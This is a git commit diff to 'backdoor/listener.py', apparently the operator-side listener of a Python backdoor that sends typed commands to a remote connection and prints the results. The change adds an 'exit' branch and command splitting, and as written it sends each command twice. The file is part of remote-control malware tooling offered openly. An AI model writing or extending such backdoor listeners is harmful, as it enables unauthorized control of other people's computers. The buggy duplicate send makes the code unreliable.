7c05ade7fc8c08537fe8bbd7e8d3be718f51c6b8
Justin Uminga <164306553+justinadg@users.noreply.github.com>
2024-07-26 10:36:54 +0800

    Update listener.py

--- backdoor/listener.py
+++ backdoor/listener.py
@@ -24,12 +24,18 @@ class Listener:
         continue
 
   def execute_remotely(self, command):
+    self.reliable_send(command)  
+    if command[0] == "exit":
+      self.connection.close()  
+      exit()  
+      
     self.reliable_send(command)
     return self.reliable_receive()
     
   def run(self):
     while True:
       command = raw_input(">> ")
+      command = command.split(" ")
       result = self.execute_remotely(command)
       print(result)
 
